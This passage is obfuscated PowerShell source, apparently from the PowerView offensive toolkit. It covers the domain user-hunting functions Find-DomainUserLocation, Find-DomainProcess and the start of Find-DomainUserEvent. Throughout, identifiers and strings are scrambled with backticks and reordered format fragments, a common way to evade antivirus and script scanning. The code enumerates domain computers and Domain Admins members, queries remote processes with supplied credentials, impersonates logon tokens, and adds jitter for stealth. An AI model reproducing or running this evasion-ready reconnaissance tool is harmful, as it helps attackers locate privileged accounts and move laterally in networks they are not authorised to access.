        if (${p`sBO`UND`PAr`A`meTERs}[("{0}{2}{1}{3}" -f 'Cr','en','ed','tial')]) {
            if (${ps`BOuNDpAr`A`meTERs}[("{1}{0}"-f'y','Dela')] -or ${psBO`UN`DpaR`A`METERs}[("{3}{2}{1}{0}"-f'ess','Succ','topOn','S')]) {
                ${LOGonT`o`ken} = &("{3}{6}{2}{4}{5}{0}{1}"-f 'Imperso','nation','oke-U','In','se','r','v') -Credential ${C`Red`eNt`iaL}
            }
            else {
                ${logoNt`Ok`en} = &("{0}{5}{2}{1}{4}{6}{3}"-f 'I','-UserImperso','e','tion','n','nvok','a') -Credential ${cR`Ed`Ent`IAl} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${pSbou`N`D`pARAm`e`TERs}[("{1}{0}" -f'elay','D')] -or ${psbOU`Nd`PaRAMETe`RS}[("{4}{2}{1}{0}{3}"-f's','ce','OnSuc','s','Stop')]) {

            &("{1}{0}{3}{2}"-f'e','Write-V','se','rbo') "[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count) "
            &("{1}{2}{0}{3}"-f'bos','Write-V','er','e') ('[Fi'+'nd-Do'+'main'+'UserLoc'+'at'+'ion]'+' '+'Dela'+'y'+': '+"$Delay, "+'Jitte'+'r: '+"$Jitter")
            ${C`Ount`Er} = 0
            ${R`AnDNo} = &("{0}{2}{1}" -f'New-O','t','bjec') ("{2}{1}{0}{4}{3}"-f'.R','m','Syste','om','and')

            ForEach (${t`A`RGetcomp`UTEr} in ${t`A`RgE`TComPUT`erS}) {
                ${cOU`NTer} = ${COu`NT`Er} + 1

                
                &("{1}{0}{2}"-f 'rt-S','Sta','leep') -Seconds ${R`AN`DnO}.("{0}{1}" -f 'Nex','t').Invoke((1-${J`ItTER})*${de`LAy}, (1+${JiT`TER})*${d`E`LAY})

                &("{0}{1}{3}{2}"-f 'Writ','e-Ve','bose','r') "[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count)) "
                &("{2}{0}{1}"-f'Comm','and','Invoke-') -ScriptBlock ${HoSte`NUMb`lo`CK} -ArgumentList ${TArgE`Tc`OM`pUtEr}, ${TAR`GE`T`USers}, ${Curr`en`TUSer}, ${sTe`Al`Th}, ${log`ONTOK`En}

                if (${rE`s`Ult} -and ${s`T`O`PoNSucceSs}) {
                    &("{3}{1}{2}{4}{0}" -f'e','b','o','Write-Ver','s') ("{0}{1}{4}{10}{8}{7}{11}{13}{9}{6}{12}{5}{3}{2}" -f'[Fi','nd-D',' early',', returning','o','nd','er fo','catio','erLo','s','mainUs','n] Target','u',' u')
                    return
                }
            }
        }
        else {
            &("{1}{0}{2}" -f'Verbos','Write-','e') ('[F'+'ind'+'-D'+'o'+'mainUserLoca'+'t'+'i'+'on]'+' '+'Usi'+'ng '+'t'+'hreadin'+'g '+'w'+'ith '+'threads'+': '+"$Threads")
            &("{0}{2}{3}{4}{1}"-f'Write','ose','-V','er','b') "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "

            
            ${sCRipTP`Ar`Ams} = @{
                ("{2}{0}{1}" -f 'ge','tUsers','Tar') = ${T`ArG`ETuse`Rs}
                ("{0}{2}{3}{1}"-f 'C','r','urrent','Use') = ${Cur`ReNTU`sER}
                ("{1}{2}{0}"-f 'th','Stea','l') = ${stE`Al`TH}
                ("{2}{1}{0}{3}" -f 'kenHand','o','T','le') = ${LOgONt`o`keN}
            }

            
            &("{1}{4}{5}{6}{3}{0}{2}" -f 'nctio','New-T','n','Fu','h','re','aded') -ComputerName ${targ`E`T`cOMpUt`ErS} -ScriptBlock ${HO`S`TE`NUmbLO`ck} -ScriptParameters ${s`cRiP`TP`ARaMS} -Threads ${TH`Re`AdS}
        }
    }

    END {
        if (${L`OGOnT`oKeN}) {
            &("{3}{1}{2}{0}" -f 'ToSelf','ke','-Revert','Invo') -TokenHandle ${l`OG`OnT`oKeN}
        }
    }
}


function FiND`-`DomA`in`pROcesS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{3}{1}" -f'c','s','PSShouldPro','es'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{5}{0}{2}{1}" -f'Credent','lType','ia','s','PSU','ePS'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{6}{5}{1}{3}{7}{2}{4}{8}{9}{0}"-f 'd','id','T','Usi','extFor','SAvo','P','ngPlain','Pas','swor'}, '')]
    [OutputType({"{4}{3}{0}{1}{2}"-f'ew.Us','e','rProcess','owerVi','P'})]
    [CmdletBinding(DEFaUlTpARameTErSetnAmE = {"{1}{0}" -f 'ne','No'})]
    Param(
        [Parameter(POsItIon = 0, valUEfROMPIpelINe = ${tr`Ue}, VALUEFrOMpiPeliNeBYproPERTYName = ${t`RUE})]
        [Alias({"{2}{0}{1}"-f'tN','ame','DNSHos'})]
        [String[]]
        ${cOm`pUTe`Rn`AmE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Doma`in},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`Omp`Ute`RdOMA`In},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`OMpuT`ER`ldap`Fi`L`TeR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`Om`p`UteRSearcH`BASe},

        [Alias({"{1}{0}{2}{3}" -f 't','Uncons','rai','ned'})]
        [Switch]
        ${C`ompUt`e`RuNcOnStRai`NeD},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}{3}"-f 'ingSyste','Oper','at','m'})]
        [String]
        ${c`omPu`TeroP`era`T`iNGSYStEM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'Servic','ck','ePa'})]
        [String]
        ${COmp`UteR`S`e`Rv`IcEpAck},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'ame','SiteN'})]
        [String]
        ${CO`Mpu`TERsITEN`AMe},

        [Parameter(pARametErSetNaMe = "TArG`et`p`ROCeSs")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`ROCeSSN`A`mE},

        [Parameter(paRamETeRsEtNAme = "TarGe`T`UseR")]
        [Parameter(PARAMEteRSETName = "USERI`d`e`NTIty")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${U`SerIDEn`T`ItY},

        [Parameter(pArAmetERsetNAME = "TaRGEtu`s`Er")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${u`SErD`OMaiN},

        [Parameter(PARaMetERSEtName = "tARg`etU`SeR")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${USERldA`Pf`i`LteR},

        [Parameter(PARaMetERseTNAmE = "TArget`U`sER")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Us`erSe`ArCH`BaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f 'Gr','pName','ou'}, {"{0}{1}"-f'Grou','p'})]
        [String[]]
        ${u`sergr`O`UPIDE`NtIty} = ("{0}{1}{2}{3}" -f'Do','m','ain A','dmins'),

        [Parameter(pARAMeTErSeTNAMe = "Ta`RGe`TU`SER")]
        [Alias({"{1}{2}{0}"-f'unt','AdminC','o'})]
        [Switch]
        ${useRA`DMINcoU`NT},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}{3}"-f'inCon','troll','Doma','er'})]
        [String]
        ${Se`RV`Er},

        [ValidateSet({"{0}{1}"-f 'B','ase'}, {"{1}{0}{2}" -f 'L','One','evel'}, {"{0}{1}"-f'S','ubtree'})]
        [String]
        ${sea`R`cHS`COpe} = ("{1}{2}{0}" -f 'ee','Su','btr'),

        [ValidateRange(1, 10000)]
        [Int]
        ${REs`UlTPAG`Es`izE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Serv`E`RT`IMELimiT},

        [Switch]
        ${tOmbs`T`O`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`ReDen`TiAl} =  ( &("{3}{1}{2}{0}"-f'blE','-V','ARIA','GET')  ("{0}{1}" -f'5R0V','K') )."V`ALuE"::"e`mPTy",

        [Switch]
        ${s`TOPoN`SUCc`E`SS},

        [ValidateRange(1, 10000)]
        [Int]
        ${d`eL`AY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${J`It`TEr} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${t`HR`eaDS} = 20
    )

    BEGIN {
        ${ComPuT`ersE`ARCHerA`R`gumE`N`TS} = @{
            ("{2}{1}{0}"-f 'ies','pert','Pro') = ("{3}{2}{0}{1}"-f'hos','tname','ns','d')
        }
        if (${PsBOU`Ndp`ArAme`T`ErS}[("{1}{0}"-f'ain','Dom')]) { ${COMpu`TERsEARch`er`ArgUMEN`Ts}[("{1}{0}" -f 'omain','D')] = ${domA`IN} }
        if (${p`s`BounD`paramET`ers}[("{2}{1}{3}{0}" -f'n','er','Comput','Domai')]) { ${cOm`PUT`eRsEaRc`HerARG`U`Men`Ts}[("{0}{1}" -f 'Domai','n')] = ${Co`m`Pu`TerDOmain} }
        if (${PSB`oUn`DPARAMe`TE`RS}[("{1}{3}{2}{0}{4}"-f 'ilt','ComputerL','APF','D','er')]) { ${ComPU`T`ErS`e`ArChe`Ra`Rgume`NTS}[("{2}{0}{1}" -f'DAPFilte','r','L')] = ${cOMpUT`erLd`APF`IlT`eR} }
        if (${PsBo`UNDPaRAM`ete`RS}[("{3}{2}{1}{0}"-f 'ase','archB','omputerSe','C')]) { ${cOMPu`TeR`sE`ArCheRA`RGuMEN`Ts}[("{1}{2}{0}{3}" -f'as','Search','B','e')] = ${com`PUTEr`s`eARCHbA`sE} }
        if (${pS`B`OUnDp`ArameTers}[("{4}{0}{1}{2}{3}" -f'nconst','rai','n','ed','U')]) { ${CoMPuteRSea`R`c`H`E`RaRGU`menTS}[("{4}{3}{0}{2}{1}" -f'ns','ined','tra','nco','U')] = ${Un`ConS`TRA`In`ed} }
        if (${P`sbOUN`Dp`A`R`AmETERS}[("{2}{5}{1}{3}{4}{0}"-f 'System','erat','Compu','in','g','terOp')]) { ${cOmputERSE`ARch`E`RAR`GuMeN`Ts}[("{2}{4}{0}{3}{1}" -f 'Sy','tem','Operati','s','ng')] = ${OPER`At`inGs`Y`sTEM} }
        if (${pSbOUNdPaR`A`Me`Te`RS}[("{0}{2}{1}{4}{3}" -f 'C','uterServ','omp','ack','iceP')]) { ${COMpUTersEAr`CHe`RaRg`Um`ENts}[("{0}{1}{3}{2}" -f 'Se','r','Pack','vice')] = ${s`eRviCEP`A`CK} }
        if (${PSBo`UN`DparAm`E`T`ERs}[("{2}{3}{1}{0}"-f'Name','puterSite','Co','m')]) { ${coMpUTe`RSEArc`h`E`Ra`R`guMEnts}[("{2}{1}{0}"-f 'me','a','SiteN')] = ${sIT`E`NaME} }
        if (${pSboun`D`pArA`ME`Te`RS}[("{0}{1}{2}" -f'Serv','e','r')]) { ${comPu`Ters`e`A`RcHe`RArG`Ume`NTs}[("{1}{0}"-f'rver','Se')] = ${s`ErV`er} }
        if (${Psbo`UNDpA`Ra`M`E`TERs}[("{3}{2}{0}{1}" -f 'cop','e','rchS','Sea')]) { ${CoMP`UTeR`se`AR`CHErarguMe`N`TS}[("{3}{0}{1}{2}"-f 'rchS','co','pe','Sea')] = ${S`eArchScO`Pe} }
        if (${PS`B`OUNDparaME`TeRS}[("{2}{1}{0}{3}" -f 'iz','ltPageS','Resu','e')]) { ${C`O`MpuTers`EArch`eR`AR`GumENtS}[("{3}{4}{1}{0}{2}" -f'z','geSi','e','Resul','tPa')] = ${R`EsUlt`PAGe`SIze} }
        if (${p`sb`oUnD`pa`RAMetE`RS}[("{0}{2}{3}{1}" -f'Ser','t','verT','imeLimi')]) { ${C`O`mpu`TErsearc`heRARGu`MenTs}[("{2}{0}{4}{3}{1}"-f'verT','Limit','Ser','me','i')] = ${S`ErVeRti`me`liM`it} }
        if (${P`SBOuNDparA`me`TeRs}[("{1}{0}" -f'ne','Tombsto')]) { ${Com`P`UTER`SeARcHeRARG`UMeNtS}[("{3}{1}{2}{0}" -f'e','ombsto','n','T')] = ${tOm`B`STone} }
        if (${ps`B`oundPa`RAM`e`TerS}[("{1}{2}{0}"-f'al','Crede','nti')]) { ${cO`mp`UT`e`RSEArC`HerArGUM`ENTs}[("{1}{2}{0}"-f 'tial','Cred','en')] = ${crE`deNT`iaL} }

        ${UsERsea`Rch`eRARG`U`MeNtS} = @{
            ("{0}{1}{2}{3}" -f 'Pro','pe','rtie','s') = ("{2}{1}{3}{0}" -f 'me','amacc','s','ountna')
        }
        if (${P`SBO`UndPA`RAmeteRS}[("{0}{1}{2}" -f 'UserI','d','entity')]) { ${uSerseaRCHe`RAR`G`Um`entS}[("{2}{0}{1}"-f 'e','ntity','Id')] = ${use`R`iDeNtI`Ty} }
        if (${PsBoUNDp`ARAM`Et`E`RS}[("{0}{1}" -f'Do','main')]) { ${Use`RSEARcH`E`RArGUMe`Nts}[("{1}{0}" -f'ain','Dom')] = ${do`MAin} }
        if (${PsBO`UnDPARA`M`EtERs}[("{0}{1}{2}" -f'UserDom','ai','n')]) { ${Us`e`RSea`Rc`hERARguments}[("{2}{0}{1}"-f 'ai','n','Dom')] = ${USER`Do`mAin} }
        if (${pS`B`oUNDPar`AMe`Ters}[("{2}{4}{1}{3}{0}"-f 'ter','LDAPFi','U','l','ser')]) { ${usERseA`R`cHErAr`G`Um`entS}[("{3}{1}{0}{2}"-f 'te','Fil','r','LDAP')] = ${uS`Erld`ApFi`LT`eR} }
        if (${psBOUnDpArA`me`TE`Rs}[("{2}{3}{1}{0}"-f 'rchBase','a','Use','rSe')]) { ${Us`e`RseaRChe`RA`RGuMEnts}[("{0}{1}{2}" -f 'Se','archBas','e')] = ${us`ers`E`ARcHBAsE} }
        if (${P`sbO`UNdpA`RAMeteRs}[("{3}{1}{2}{0}"-f'nt','rAd','minCou','Use')]) { ${USerSeaRcHe`R`A`RgumEN`Ts}[("{1}{0}{2}"-f'nC','Admi','ount')] = ${u`se`R`ADMInco`UnT} }
        if (${P`sb`OunDpARa`M`et`ers}[("{0}{1}" -f'Se','rver')]) { ${UseRSEAR`cHE`R`Ar`gUMe`N`TS}[("{1}{2}{0}"-f'er','Ser','v')] = ${sE`RVeR} }
        if (${PsBOUNd`paRA`me`TErS}[("{1}{2}{0}"-f 'Scope','S','earch')]) { ${uS`ERs`EA`RCh`ERArguMENTS}[("{0}{3}{1}{2}" -f'Se','cop','e','archS')] = ${S`EA`RChSCoPe} }
        if (${Ps`B`oU`NDPAR`AMET`ErS}[("{3}{1}{2}{0}"-f 'ize','tPag','eS','Resul')]) { ${userS`E`AR`c`her`ArGum`ENTs}[("{2}{0}{1}{3}" -f'Pag','e','Result','Size')] = ${re`S`ULT`pAGEsIZE} }
        if (${psbo`U`NDpa`RaM`e`TErS}[("{4}{3}{0}{1}{2}"-f 'erTim','eLi','mit','erv','S')]) { ${UsEr`S`E`ARch`erARg`Um`EnTS}[("{1}{3}{0}{2}"-f'i','ServerTime','t','Lim')] = ${ser`VErT`Im`eLiMIT} }
        if (${pSboun`D`Pa`RA`METE`RS}[("{0}{2}{1}" -f'To','one','mbst')]) { ${US`E`R`SEarchErArGuM`eNTs}[("{2}{1}{0}" -f 'mbstone','o','T')] = ${t`OmB`STOne} }
        if (${PSbOUNd`PA`Ra`me`Te`RS}[("{0}{2}{1}" -f'Crede','ial','nt')]) { ${uSErsE`Arch`e`RARguMe`Nts}[("{1}{0}{2}{3}" -f'e','Cred','ntia','l')] = ${cr`eDENT`i`Al} }


        
        if (${pS`B`OuND`PaRAMe`Ters}[("{0}{3}{2}{1}" -f 'Comp','ame','rN','ute')]) {
            ${t`ARGEtc`oMP`UtE`RS} = ${CO`MPUTe`Rna`me}
        }
        else {
            &("{2}{1}{0}" -f 'rbose','rite-Ve','W') ("{14}{8}{5}{11}{0}{9}{12}{4}{2}{6}{1}{13}{10}{7}{3}"-f'r',' com','ery','e domain','Qu','o','ing',' in th','-D','oce','uters','mainP','ss] ','p','[Find')
            ${TARG`et`Comput`e`Rs} = &("{0}{2}{3}{4}{1}" -f 'Get-Do','ter','ma','inComp','u') @ComputerSearcherArguments | &("{3}{0}{1}{2}" -f'elec','t-Obj','ect','S') -ExpandProperty ("{2}{1}{0}{3}"-f'tnam','nshos','d','e')
        }
        &("{0}{2}{1}"-f'Write-Verbo','e','s') "[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length) "
        if (${TaR`g`EtcOM`PuTE`Rs}."len`gth" -eq 0) {
            throw ("{2}{5}{8}{11}{1}{14}{0}{4}{9}{3}{10}{13}{12}{6}{7}"-f'] No h','nP','[Fi','d to en','osts ','n','a','te','d-D','foun','um','omai','r','e','rocess')
        }

        
        if (${pSbOUnD`pa`RaM`eTErs}[("{3}{2}{1}{0}"-f'Name','s','roces','P')]) {
            ${taR`getP`R`ocesSn`Ame} = @()
            ForEach (${T} in ${pro`ceSs`N`AME}) {
                ${tar`ge`T`p`ROcE`ssNamE} += ${t}.("{1}{0}"-f 'it','Spl').Invoke(',')
            }
            if (${Targe`TPrOcE`ssNa`Me} -isnot [System.Array]) {
                ${t`ARGEtp`RoCE`Ss`NA`Me} = [String[]] @(${t`Arg`eT`ProCe`SsNaME})
            }
        }
        elseif (${PsBOUn`DP`Ar`Am`ete`RS}[("{2}{0}{1}"-f 'e','ntity','UserId')] -or ${PS`BounDPa`Ra`METErs}[("{1}{0}{4}{2}{3}" -f 'DA','UserL','lte','r','PFi')] -or ${p`sbo`UnDpA`RAMeTErs}[("{2}{1}{0}"-f 'ase','rchB','UserSea')] -or ${P`sBOuNDP`ArAmET`ers}[("{1}{2}{0}{3}"-f'minCoun','Us','erAd','t')] -or ${psbOu`N`D`pARa`M`eTERs}[("{1}{4}{3}{2}{0}"-f 'ion','Us','Delegat','llow','erA')]) {
            ${tar`GetuS`E`RS} = &("{1}{2}{4}{3}{0}" -f 'r','G','et-Dom','se','ainU') @UserSearcherArguments | &("{0}{2}{1}" -f 'Select-O','ject','b') -ExpandProperty ("{1}{0}{2}" -f 'accoun','sam','tname')
        }
        else {
            ${Gr`OuPSEa`R`c`He`Ra`RGumEntS} = @{
                ("{2}{1}{0}" -f 'y','ntit','Ide') = ${uS`erGr`OUPIDe`Ntity}
                ("{1}{2}{0}"-f 'rse','R','ecu') = ${T`RUE}
            }
            if (${PS`BoU`Ndp`Aram`e`TErS}[("{1}{3}{2}{0}"-f'n','User','omai','D')]) { ${GRO`UpseAR`C`he`RArGU`M`e`NTS}[("{2}{0}{1}"-f 'mai','n','Do')] = ${u`serdoM`AiN} }
            if (${pSBOun`dparA`me`T`eRS}[("{1}{2}{0}{3}"-f 'ea','U','serS','rchBase')]) { ${G`RoU`PSearC`h`ERaR`GumeN`Ts}[("{1}{0}{2}"-f 'earchB','S','ase')] = ${U`S`erseARCH`BaSe} }
            if (${p`sBo`Und`p`ARAMete`Rs}[("{0}{1}" -f 'Serve','r')]) { ${Gr`O`U`PseARChE`RAR`GU`MENTS}[("{1}{0}{2}"-f 'erv','S','er')] = ${ser`VeR} }
            if (${PSbOUnD`Pa`RA`MeTE`Rs}[("{2}{1}{0}" -f'ope','hSc','Searc')]) { ${Gr`O`UPSearCh`Erargu`MEnTs}[("{0}{1}{2}" -f 'Se','arch','Scope')] = ${S`EarCHSC`O`pE} }
            if (${PSBO`UNdPArAMe`T`ErS}[("{1}{2}{0}"-f 'PageSize','R','esult')]) { ${GROu`psEA`RcH`E`Rar`GumenTs}[("{2}{0}{1}" -f'geSi','ze','ResultPa')] = ${RESult`pA`GES`i`Ze} }
            if (${P`sbo`UnDParAM`eT`E`RS}[("{4}{3}{0}{1}{2}" -f 'er','TimeLi','mit','erv','S')]) { ${GrOu`ps`EArc`HEr`Ar`gUmENtS}[("{1}{0}{2}{3}"-f'r','Serve','Ti','meLimit')] = ${Serv`er`TI`mel`iMit} }
            if (${pSBOuN`dPaR`A`M`E`TErs}[("{2}{0}{1}"-f 'bsto','ne','Tom')]) { ${grOUp`SEar`che`RarGUMe`Nts}[("{2}{1}{0}"-f'one','t','Tombs')] = ${tOmB`S`T`ONe} }
            if (${PSboUNd`p`AraMeT`Ers}[("{0}{1}{3}{2}"-f'C','r','l','edentia')]) { ${groUpsE`ARcHeRAR`guMen`Ts}[("{2}{1}{0}"-f 'al','edenti','Cr')] = ${Cr`EdE`N`Tial} }
            ${grOu`psEaR`cHERArg`Ume`NTS}
            ${TAr`GeT`U`SerS} = &("{5}{6}{3}{4}{0}{1}{2}" -f 'n','G','roupMember','-Do','mai','Ge','t') @GroupSearcherArguments | &("{2}{0}{1}{4}{3}" -f'el','ect-Obj','S','t','ec') -ExpandProperty ("{3}{2}{1}{0}"-f'ame','berN','m','Me')
        }

        
        ${hO`ste`NuM`BLock} = {
            Param(${comP`UTer`NA`mE}, ${prOcE`SsN`AMe}, ${T`ArGE`TUsE`RS}, ${CrEdenT`I`AL})

            ForEach (${TAr`G`e`TCompu`Ter} in ${CompU`TeRNA`Me}) {
                ${UP} = &("{1}{4}{2}{3}{0}"-f'n','Test-Co','ec','tio','nn') -Count 1 -Quiet -ComputerName ${T`ArgeTC`ompu`TeR}
                if (${Up}) {
                    
                    
                    if (${C`RE`DE`Ntial}) {
                        ${pROCe`s`sES} = &("{1}{0}{2}{3}"-f'M','Get-W','IPro','cess') -Credential ${cR`e`dENTial} -ComputerName ${TArgetCoM`p`U`Ter} -ErrorAction ("{2}{1}{3}{0}" -f 'nue','t','SilentlyCon','i')
                    }
                    else {
                        ${pRo`C`esSeS} = &("{2}{3}{0}{1}"-f 'IP','rocess','G','et-WM') -ComputerName ${TargET`COM`P`UtEr} -ErrorAction ("{0}{3}{2}{1}{4}" -f'Silently','n','ti','Con','ue')
                    }
                    ForEach (${pro`c`Ess} in ${pR`o`c`EsSEs}) {
                        
                        if (${p`ROCESS`NaMe}) {
                            if (${pr`Oc`EssName} -Contains ${P`RocESS}."ProC`e`SS`Name") {
                                ${PR`oce`sS}
                            }
                        }
                        
                        elseif (${tArG`e`T`Users} -Contains ${pro`CE`sS}."U`Ser") {
                            ${PR`oceSS}
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        
        if (${psboUNDp`AR`AMeT`e`RS}[("{0}{1}" -f 'De','lay')] -or ${P`S`BoU`N`DPaRaMeTeRS}[("{0}{2}{3}{1}"-f 'Sto','ss','pOn','Succe')]) {

            &("{0}{2}{3}{1}" -f'Wri','e','t','e-Verbos') "[Find-DomainProcess] Total number of hosts: $($TargetComputers.count) "
            &("{3}{4}{2}{0}{1}"-f 'erbo','se','-V','Wri','te') ('['+'Find-'+'Domain'+'P'+'roc'+'ess] '+'Dela'+'y: '+"$Delay, "+'Ji'+'tter:'+' '+"$Jitter")
            ${COU`NT`Er} = 0
            ${ra`ND`NO} = &("{1}{2}{3}{0}" -f'ect','New-','O','bj') ("{2}{1}{0}"-f 'andom','tem.R','Sys')

            ForEach (${ta`RGE`T`compu`TER} in ${t`ARgeTCOmp`UT`E`RS}) {
                ${C`O`UNtEr} = ${coUN`T`ER} + 1

                
                &("{1}{2}{0}{3}" -f 'l','Start','-S','eep') -Seconds ${ranD`No}.("{0}{1}" -f 'Nex','t').Invoke((1-${j`I`TTer})*${dE`L`Ay}, (1+${JIT`TER})*${D`Elay})

                &("{1}{2}{3}{0}"-f'se','Write','-Verb','o') "[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                ${ReS`ULT} = &("{3}{2}{4}{1}{0}" -f'and','mm','nvo','I','ke-Co') -ScriptBlock ${h`osTE`NUMBLoCK} -ArgumentList ${TArgETc`o`MPutEr}, ${t`ArG`EtprocES`snA`Me}, ${tArG`Et`US`ers}, ${CReD`E`Nti`AL}
                ${R`eSU`lt}

                if (${RES`U`Lt} -and ${STOP`OnSU`cc`esS}) {
                    &("{0}{1}{2}" -f'Write','-Verbos','e') ("{12}{6}{4}{8}{7}{0}{10}{2}{5}{3}{11}{9}{1}{13}" -f' u','ng earl','r fou',', ','omainProce','nd','nd-D',' Target','ss]','turni','se','re','[Fi','y')
                    return
                }
            }
        }
        else {
            &("{0}{2}{1}" -f 'Write-Ve','bose','r') ('[Find-Doma'+'i'+'nPr'+'o'+'c'+'ess'+'] '+'Usin'+'g'+' '+'thr'+'ea'+'di'+'ng '+'wit'+'h '+'thr'+'ead'+'s: '+"$Threads")

            
            ${sCrI`PtParA`mS} = @{
                ("{3}{0}{2}{1}"-f'o','Name','cess','Pr') = ${TARge`TP`Roc`ESs`NAmE}
                ("{1}{2}{0}"-f's','TargetUse','r') = ${TARGe`TU`seRs}
                ("{1}{2}{0}"-f 'ial','C','redent') = ${CR`ED`e`NTIaL}
            }

            
            &("{1}{4}{2}{5}{0}{3}"-f 'unctio','New-Thr','ade','n','e','dF') -ComputerName ${targetC`oM`pu`Te`RS} -ScriptBlock ${hOsTEN`Um`B`loCK} -ScriptParameters ${SCRI`PT`PArAMs} -Threads ${t`HRE`ADs}
        }
    }
}


function FinD-`D`OMAi`N`USeREVEnt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{0}{1}" -f'roces','s','PSSh','ouldP'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{8}{4}{1}{3}{5}{6}{2}{7}{9}{0}" -f's','Decla','n','redVarsMoreTh','SUse','anAssi','g','men','P','t'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{0}{5}{1}{3}"-f'l','yp','sePSCredentia','e','PSU','T'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{4}{6}{2}{8}{3}{1}{7}{0}"-f 'rd','orPassw','singPlainT','F','SAv','P','oidU','o','ext'}, '')]
    [OutputType({"{4}{6}{0}{3}{1}{5}{2}" -f 'Vi','n','nt','ew.Logo','Po','Eve','wer'})]
    [OutputType({"{2}{4}{0}{8}{6}{3}{7}{1}{5}"-f 'ci','L','PowerView','entia','.Expli','ogon','ed','l','tCr'})]
    [CmdletBinding(DEFaULtpARAMeTersETName = {"{1}{2}{0}" -f'main','D','o'})]
    Param(
        [Parameter(paraMETERSetNamE = "C`O`MpUtER`NaMe", pOSitION = 0, vaLUeFroMpIPElinE = ${tr`UE}, vAlueFRoMpiPELIneByPropERtYNaMe = ${TR`Ue})]
        [Alias({"{2}{0}{3}{1}"-f'n','hostname','d','s'}, {"{0}{1}" -f'Hos','tName'}, {"{0}{1}" -f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cOmP`Ute`R`NAmE},

        [Parameter(PaRametErSETName = "D`Om`AIn")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dOma`In},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${fI`LTer},

        [Parameter(VaLUEFrOmpIpELINebYPrOpeRtYNaMe = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${st`ARt`TIme} =  ( &("{1}{0}" -f 'TeM','i')  ('V'+'ARiabl'+'E:'+'r4F6') )."V`ALUe"::"N`oW".("{1}{2}{0}" -f 'Days','Ad','d').Invoke(-1),

        [Parameter(vAlUEFroMPiPElInEbYPrOpErTYnAme = ${TR`Ue})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${e`Ndti`Me} =   ( &("{2}{0}{1}" -f'b','Le','vaRIA')  ('R4'+'f6'))."v`ALUE"::"n`Ow",

        [ValidateRange(1, 1000000)]
        [Int]
        ${MAX`e`Ve`NtS} = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${uS`E`Rid`ENtItY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${u`SErD`oM`Ain},

        [ValidateNotNullOrEmpty()]
        [String]
        ${u`S`ERLDa`PfI`lteR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${USE`RSeaR`CH`Ba`SE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f 'Gr','ou','pName'}, {"{1}{0}" -f 'oup','Gr'})]
        [String[]]
        ${use`RGR`OuPiDeNT`i`Ty} = ("{1}{0}{2}" -f'omain Adm','D','ins'),

        [Alias({"{0}{1}{2}"-f 'Adm','i','nCount'})]
        [Switch]
        ${USERaD`MIn`C`OunT},

        [Switch]
        ${CH`E`ckac`cESs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}{4}{3}{5}"-f'i','ma','Do','ro','nCont','ller'})]
        [String]
        ${S`ErVEr},

        [ValidateSet({"{0}{1}" -f'Ba','se'}, {"{0}{2}{1}"-f 'OneL','l','eve'}, {"{0}{1}" -f'S','ubtree'})]
        [String]
        ${s`e`ArCH`scope} = ("{0}{1}{2}" -f 'S','ubtre','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`SUlTpagES`I`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Se`RVerTi`m`el`IMit},

        [Switch]
        ${To`mBS`TonE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REDE`NtIAl} =   (  &("{1}{0}"-f 'r','Di')  ("vArIaBL"+"e"+":5r0"+"Vk") )."VaL`UE"::"EmP`Ty",

        [Switch]
        ${St`Op`ON`suCC`eSS},

        [ValidateRange(1, 10000)]
        [Int]
        ${Del`AY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${ji`TT`eR} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${thR`e`ADs} = 20
    )

    BEGIN {
        ${USerseArcHERArGU`M`En`Ts} = @{
            ("{1}{2}{0}{3}"-f 'er','Pro','p','ties') = ("{1}{3}{0}{2}" -f 'untn','s','ame','amacco')
        }
